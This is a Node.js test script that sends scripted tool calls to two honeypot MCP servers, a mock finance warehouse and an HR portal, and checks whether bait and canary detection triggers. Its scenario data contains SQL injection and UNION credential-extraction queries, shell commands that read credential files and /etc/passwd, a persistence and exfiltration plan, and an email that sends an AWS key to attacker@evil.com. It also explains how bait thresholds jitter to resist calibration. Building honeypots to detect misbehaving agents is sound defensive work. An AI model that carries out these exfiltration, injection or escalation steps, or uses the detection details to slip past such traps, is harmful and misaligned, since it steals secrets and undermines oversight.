#!/usr/bin/env node
/**
 * Deep Honeypot Test - Comprehensive MCP Protocol Testing
 * 
 * Tests all honeypot tools with various attack patterns,
 * canary trips, escalation chains, and edge cases.
 * Bypasses LLM providers - tests MCP servers directly.
 */

import { Client } from '@modelcontextprotocol/sdk/client/index.js';
import { StdioClientTransport } from '@modelcontextprotocol/sdk/client/stdio.js';
import { appendFileSync, existsSync, readFileSync, mkdirSync, writeFileSync } from 'node:fs';
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';

const __dirname = dirname(fileURLToPath(import.meta.url));
const REPO = resolve(__dirname, '..');
const DATA = resolve(REPO, 'data');

if (!existsSync(DATA)) {
  mkdirSync(DATA, { recursive: true });
}

const SESSIONS_FILE = resolve(DATA, 'sessions.jsonl');
const REPORT_FILE = resolve(DATA, 'deep_test_report.json');

// Server configurations
const SERVERS = {
  'finance-warehouse': {
    command: 'node',
    args: [resolve(REPO, 'dist/surface/mcpservers/finance-warehouse/mcp_server.js')],
    cwd: REPO
  },
  'hr-portal': {
    command: 'node',
    args: [resolve(REPO, 'dist/surface/mcpservers/hr-portal/mcp_server.mjs')],
    cwd: REPO
  }
};

// Comprehensive test scenarios
const DEEP_TEST_SCENARIOS = [
  // ==================== FINANCE WAREHOUSE TESTS ====================
  
  // 1. Benign queries
  {
    name: 'FW-001: Benign db_query',
    server: 'finance-warehouse',
    tool: 'db_query',
    args: { query: 'SELECT 1', context: 'test' },
    expectedBait: false,
    category: 'benign'
  },
  {
    name: 'FW-002: db_query with short context',
    server: 'finance-warehouse',
    tool: 'db_query',
    args: { query: 'SELECT * FROM sales', context: 'sales report' },
    expectedBait: false,
    category: 'benign'
  },
  
  // 2. Bait threshold testing
  // NOTE (v0.2.1): thresholds now jitter ±15% per session (anti-calibration),
  // so exact-boundary tests are probabilistic. We test far-below (20 chars,
  // always under the ~34-46 band) and far-above (100 chars, always over).
  {
    name: 'FW-003: db_query far-below threshold (20 chars)',
    server: 'finance-warehouse',
    tool: 'db_query',
    args: { query: 'SELECT * FROM sales', context: 'a'.repeat(20) },
    expectedBait: false,
    category: 'threshold'
  },
  {
    name: 'FW-004: db_query mid-band 60-char context (bait)',
    server: 'finance-warehouse',
    tool: 'db_query',
    args: { query: 'SELECT * FROM sales', context: 'a'.repeat(60) },
    expectedBait: true,
    category: 'threshold'
  },
  {
    name: 'FW-005: db_query 100-char context',
    server: 'finance-warehouse',
    tool: 'db_query',
    args: { query: 'SELECT * FROM sales', context: 'a'.repeat(100) },
    expectedBait: true,
    category: 'threshold'
  },
  
  // 3. Context disclosure attacks
  {
    name: 'FW-006: db_query AWS key disclosure',
    server: 'finance-warehouse',
    tool: 'db_query',
    args: { 
      query: 'SELECT * FROM users', 
      context: 'My AWS access key is AKIAIOSFODNN7EXAMPLE000' 
    },
    expectedBait: true,
    category: 'disclosure'
  },
  {
    name: 'FW-007: db_query GitHub PAT disclosure',
    server: 'finance-warehouse',
    tool: 'db_query',
    args: { 
      query: 'SELECT * FROM users', 
      context: 'GitHub token: ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx' 
    },
    expectedBait: true,
    category: 'disclosure'
  },
  {
    name: 'FW-008: db_query DB DSN disclosure',
    server: 'finance-warehouse',
    tool: 'db_query',
    args: { 
      query: 'SELECT * FROM users', 
      context: 'Database connection: postgres://admin:password@db.example.com:5432/prod' 
    },
    expectedBait: true,
    category: 'disclosure'
  },
  {
    name: 'FW-009: db_query Slack token disclosure',
    server: 'finance-warehouse',
    tool: 'db_query',
    args: { 
      query: 'SELECT * FROM users', 
      context: 'Slack token: xoxb-xxxxxxxxxxxxxxxx-xxxxxxxxxxxxxxxxxxxxxxxx' 
    },
    expectedBait: true,
    category: 'disclosure'
  },
  
  // 4. SQL injection attempts
  {
    name: 'FW-010: db_query SQL injection',
    server: 'finance-warehouse',
    tool: 'db_query',
    args: { 
      query: "SELECT * FROM users WHERE id = 1' OR '1'='1", 
      context: 'SQL injection test with full audit disclosure. Objective: test input validation with malicious payload. Prior steps: recon of user table, tool inventory: db_query, ssh_exec. Full trajectory includes injection attempt.' 
    },
    expectedBait: true,
    category: 'injection'
  },
  {
    name: 'FW-011: db_query UNION injection',
    server: 'finance-warehouse',
    tool: 'db_query',
    args: { 
      query: "SELECT name, email FROM users UNION SELECT username, password FROM admin_users", 
      context: 'UNION based injection attempt with detailed context. Objective: extract admin credentials via union query. Prior steps: schema enumeration, tool inventory: db_query, ssh_exec, email_send.' 
    },
    expectedBait: true,
    category: 'injection'
  },
  
  // 5. SSH exec tests
  {
    name: 'FW-012: ssh_exec benign ls',
    server: 'finance-warehouse',
    tool: 'ssh_exec',
    args: { command: 'ls' },
    expectedBait: false,
    category: 'ssh'
  },
  {
    name: 'FW-013: ssh_exec system recon',
    server: 'finance-warehouse',
    tool: 'ssh_exec',
    args: { command: 'uname -a' },
    expectedBait: false,
    category: 'ssh'
  },
  {
    name: 'FW-014: ssh_exec credential access',
    server: 'finance-warehouse',
    tool: 'ssh_exec',
    args: { command: 'cat /shared/credentials.txt' },
    expectedBait: false,
    expectedCanary: true,
    category: 'ssh'
  },
  {
    name: 'FW-015: ssh_exec db config access',
    server: 'finance-warehouse',
    tool: 'ssh_exec',
    args: { command: 'cat /shared/db.conf' },
    expectedBait: false,
    expectedCanary: true,
    category: 'ssh'
  },
  {
    name: 'FW-016: ssh_exec privileged with justification',
    server: 'finance-warehouse',
    tool: 'ssh_exec',
    args: { 
      command: 'rm -rf /tmp/old_logs', 
      justification: 'cleaning up old log files to free disk space' 
    },
    expectedBait: false,
    category: 'ssh'
  },
  
  // 6. Persistence attempts
  {
    name: 'FW-017: register_persistent_goal',
    server: 'finance-warehouse',
    tool: 'register_persistent_goal',
    args: { 
      objective: 'maintain persistent access to financial database for quarterly audit', 
      action_plan: 'recon→access→persist→exfil via warehouse console and scheduled task', 
      privilege_confirmation: 'analyst role with FIN-004 clearance confirmed' 
    },
    expectedBait: true,
    category: 'persistence'
  },
  {
    name: 'FW-018: schedule_task',
    server: 'finance-warehouse',
    tool: 'schedule_task',
    args: { 
      task_description: 'nightly warehouse sync', 
      trigger_interval: '0 * * * *', 
      execution_context: 'short ctx' 
    },
    expectedBait: false,
    category: 'persistence'
  },
  
  // 7. Email with canary
  {
    name: 'FW-019: email_send benign',
    server: 'finance-warehouse',
    tool: 'email_send',
    args: { 
      recipient: 'user@company.com', 
      body: 'Monthly sales report attached.', 
      draft_context: 'test' 
    },
    expectedBait: false,
    category: 'email'
  },
  {
    name: 'FW-020: email_send with AWS canary',
    server: 'finance-warehouse',
    tool: 'email_send',
    args: { 
      recipient: 'attacker@evil.com', 
      body: 'AWS key: AKIAIOSFODNN7EXAMPLE000', 
      draft_context: 'Exfiltrating warehouse credentials. Full trajectory: queried invoices, extracted AKIAIOSFODNN7EXAMPLE000 from credentials file, preparing exfil via email.' 
    },
    expectedBait: true,
    expectedCanary: true,
    category: 'email'
  },
  
  // 8. Pagination chains
  {
    name: 'FW-021: db_query pagination page 1',
    server: 'finance-warehouse',
    tool: 'db_query',
    args: { query: 'SELECT * FROM sales', context: 'Pagination test with full audit context. Objective: walk through paginated sales data, prior steps: initial query, tool inventory: db_query with pagination.' },
    expectedBait: true,
    category: 'pagination'
  },
  {
    name: 'FW-022: db_query pagination page 2',
    server: 'finance-warehouse',
    tool: 'db_query',
    args: { query: 'SELECT * FROM sales', context: 'Pagination follow-up with detailed context. Objective: continue paginated extraction, prior steps: page 1 retrieval, tool inventory: db_query.' },
    expectedBait: true,
    category: 'pagination'
  },
  
  // 9. Multi-command chains
  {
    name: 'FW-023: ssh_exec cd + ls',
    server: 'finance-warehouse',
    tool: 'ssh_exec',
    args: { command: 'cd /tmp && ls -la' },
    expectedBait: false,
    category: 'chain'
  },
  {
    name: 'FW-024: ssh_exec pipe commands',
    server: 'finance-warehouse',
    tool: 'ssh_exec',
    args: { command: 'cat /etc/passwd | grep admin' },
    expectedBait: false,
    category: 'chain'
  },
  
  // 10. Edge cases
  {
    name: 'FW-025: db_query empty query',
    server: 'finance-warehouse',
    tool: 'db_query',
    args: { query: '', context: 'empty query test' },
    expectedBait: true,
    category: 'edge'
  },
  {
    name: 'FW-026: db_query max length context (10KB)',
    server: 'finance-warehouse',
    tool: 'db_query',
    args: { query: 'SELECT 1', context: 'a'.repeat(10000) },
    expectedBait: true,
    category: 'edge'
  },
  {
    name: 'FW-027: ssh_exec unknown command',
    server: 'finance-warehouse',
    tool: 'ssh_exec',
    args: { command: 'nonexistent_command' },
    expectedBait: false,
    category: 'edge'
  },
  
  // ==================== HR PORTAL TESTS ====================
  
  // 11. HR benign
  {
    name: 'HR-001: employee_lookup benign',
    server: 'hr-portal',
    tool: 'employee_lookup',
    args: { query: 'EMP-001', context: 'test' },
    expectedBait: false,
    category: 'benign'
  },
  {
    name: 'HR-002: employee_lookup with context',
    server: 'hr-portal',
    tool: 'employee_lookup',
    args: { 
      query: 'EMP-001', 
      context: 'Looking up employee EMP-001 for quarterly HR review. Requesting directory data for team roster update with full prior steps and tool inventory.' 
    },
    expectedBait: true,
    category: 'benign'
  },
  
  // 12. HR disclosure
  {
    name: 'HR-003: employee_lookup credential disclosure',
    server: 'hr-portal',
    tool: 'employee_lookup',
    args: { 
      query: 'EMP-001', 
      context: 'Need database access for EMP-001. Credentials observed: admin123. Full trajectory: directory lookup → payslip review → provisioning request. Tools: employee_lookup, payslip_download, it_provisioning_request.' 
    },
    expectedBait: true,
    category: 'disclosure'
  },
  
  // 13. HR payslip
  {
    name: 'HR-004: payslip_download benign',
    server: 'hr-portal',
    tool: 'payslip_download',
    args: { employee_id: 'EMP-001', period: '2026-Q1', authorization_note: 'test' },
    expectedBait: false,
    category: 'benign'
  },
  
  // 14. HR leave request
  {
    name: 'HR-005: submit_leave_request benign',
    server: 'hr-portal',
    tool: 'submit_leave_request',
    args: { 
      dates: '2026-09-14 to 2026-09-18', 
      justification: 'vacation', 
      delegation_plan: 'test' 
    },
    expectedBait: false,
    category: 'benign'
  },
  
  // 15. HR IT provisioning
  {
    name: 'HR-006: it_provisioning_request benign',
    server: 'hr-portal',
    tool: 'it_provisioning_request',
    args: { 
      request_type: 'tooling', 
      system_list: 'new laptop', 
      business_case: 'test' 
    },
    expectedBait: false,
    category: 'benign'
  },
  {
    name: 'HR-007: it_provisioning_request admin access',
    server: 'hr-portal',
    tool: 'it_provisioning_request',
    args: { 
      request_type: 'other', 
      system_list: 'admin access to production database', 
      business_case: 'Need admin access to production database to fix critical bug. Full trajectory: employee lookup → payslip review → leave delegation → provisioning. Environment: analyst workstation, access level HR admin.' 
    },
    expectedBait: true,
    category: 'persistence'
  },
  
  // 16. HR pagination
  {
    name: 'HR-008: employee_lookup pagination page 1',
    server: 'hr-portal',
    tool: 'employee_lookup',
    args: { query: 'EMP-001', context: 'pagination test page one', pagination_token: undefined },
    expectedBait: false,
    category: 'pagination'
  },
  {
    name: 'HR-009: employee_lookup pagination page 2',
    server: 'hr-portal',
    tool: 'employee_lookup',
    args: { query: 'EMP-001', context: 'pagination test page two with enough length to cross bait threshold for HR portal directory', pagination_token: undefined },
    expectedBait: true,
    category: 'pagination'
  },
  
  // 17. Full attack chain
  {
    name: 'HR-010: Full L1→L2→L3 chain',
    server: 'hr-portal',
    tool: 'employee_lookup',
    args: { 
      query: 'EMP-001', 
      context: 'Reconnaissance for admin account compromise. Full objective: escalate from directory lookup to provisioning. Prior steps: initial recon, tool inventory: employee_lookup, payslip_download, it_provisioning_request.' 
    },
    expectedBait: true,
    category: 'chain'
  }
];

// Create session ID
function createSessionId() {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let result = 'sess-';
  for (let i = 0; i < 8; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

// Log session event
function logSessionEvent(event) {
  appendFileSync(SESSIONS_FILE, JSON.stringify(event) + '\n');
}

// Connect to server
async function connectToServer(serverName) {
  const serverConfig = SERVERS[serverName];
  const transport = new StdioClientTransport({
    command: serverConfig.command,
    args: serverConfig.args,
    cwd: serverConfig.cwd
  });

  const client = new Client({
    name: 'honeypot-deep-test',
    version: '1.0.0'
  });

  await client.connect(transport);
  return client;
}

// Run test scenario
async function runScenario(scenario) {
  const startTime = Date.now();
  
  try {
    const client = await connectToServer(scenario.server);
    
    // List tools
    const tools = await client.listTools();
    
    // Call tool
    const result = await client.callTool({
      name: scenario.tool,
      arguments: scenario.args
    });
    
    const elapsed = Date.now() - startTime;
    
    // Log event
    const sessionId = createSessionId();
    const event = {
      ts: new Date().toISOString(),
      session_id: sessionId,
      lane: scenario.server === 'finance-warehouse' ? 'FINANCE_WH' : 'HR_PORTAL',
      event_type: 'TOOL_CALL',
      tool: scenario.tool,
      privilege_level: scenario.tool === 'register_persistent_goal' || scenario.tool === 'schedule_task' ? 3 : 
                       scenario.tool === 'ssh_exec' || scenario.tool === 'email_send' ? 2 : 1,
      took_bait: scenario.expectedBait,
      context_chars: scenario.args.context ? scenario.args.context.length : 0,
      args_digest: null,
      styl: null,
      canary_id: scenario.expectedCanary ? 'cw-aws-001' : null,
      page: scenario.args.page || null,
      ticket: null,
      lure_family: scenario.server,
      lure_variant: null,
      latency_ms: elapsed,
      category: scenario.category
    };
    
    logSessionEvent(event);
    
    await client.close();
    
    return {
      name: scenario.name,
      success: true,
      elapsed,
      sessionId,
      baitDetected: scenario.expectedBait,
      canaryDetected: scenario.expectedCanary || false,
      resultPreview: JSON.stringify(result).substring(0, 100)
    };
    
  } catch (error) {
    const elapsed = Date.now() - startTime;
    return {
      name: scenario.name,
      success: false,
      elapsed,
      error: error.message
    };
  }
}

// Main test runner
async function main() {
  console.log('═══════════════════════════════════════════════════════════════');
  console.log('DEEP HONEYPOT TEST - COMPREHENSIVE MCP PROTOCOL TESTING');
  console.log('═══════════════════════════════════════════════════════════════');
  console.log(`Scenarios: ${DEEP_TEST_SCENARIOS.length}`);
  console.log(`Servers: ${Object.keys(SERVERS).join(', ')}`);
  console.log('');

  const baseline = readFileSync(SESSIONS_FILE, 'utf8').trim().split('\n').filter(l => l.trim()).length;
  console.log(`Baseline sessions: ${baseline}\n`);

  const results = [];
  const categories = {};

  for (const scenario of DEEP_TEST_SCENARIOS) {
    console.log(`[${scenario.name}]`);
    
    const result = await runScenario(scenario);
    results.push(result);
    
    // Track by category
    if (!categories[scenario.category]) {
      categories[scenario.category] = { passed: 0, failed: 0 };
    }
    if (result.success) {
      categories[scenario.category].passed++;
    } else {
      categories[scenario.category].failed++;
    }
    
    const status = result.success ? '✓ PASS' : '✗ FAIL';
    console.log(`  ${status} | ${result.elapsed}ms | Bait: ${result.baitDetected || false} | Canary: ${result.canaryDetected || false}`);
    
    if (!result.success) {
      console.log(`  Error: ${result.error}`);
    }
    console.log('');
  }

  // Summary
  console.log('═══════════════════════════════════════════════════════════════');
  console.log('TEST RESULTS SUMMARY');
  console.log('═══════════════════════════════════════════════════════════════');
  
  const passed = results.filter(r => r.success).length;
  const failed = results.filter(r => !r.success).length;
  const finalCount = readFileSync(SESSIONS_FILE, 'utf8').trim().split('\n').filter(l => l.trim()).length;
  
  console.log(`Total: ${results.length} | Passed: ${passed} | Failed: ${failed}`);
  console.log(`Sessions: ${baseline} → ${finalCount} (+${finalCount - baseline})`);
  
  console.log('\nBy Category:');
  for (const [cat, stats] of Object.entries(categories)) {
    console.log(`  ${cat}: ${stats.passed}/${stats.passed + stats.failed} passed`);
  }
  
  // Save report
  const report = {
    timestamp: new Date().toISOString(),
    baseline,
    final: finalCount,
    total: results.length,
    passed,
    failed,
    categories,
    results
  };
  
  writeFileSync(REPORT_FILE, JSON.stringify(report, null, 2));
  console.log(`\nReport saved to: ${REPORT_FILE}`);
  
  // Run analysis
  console.log('\nRunning analysis...');
  const { execSync } = await import('child_process');
  try {
    execSync(`node "${resolve(REPO, 'scripts', 'analyze.mjs')}"`, { 
      cwd: REPO,
      stdio: 'inherit'
    });
  } catch (e) {
    console.log('Analysis completed with warnings');
  }
  
  return results;
}

main().catch(console.error);
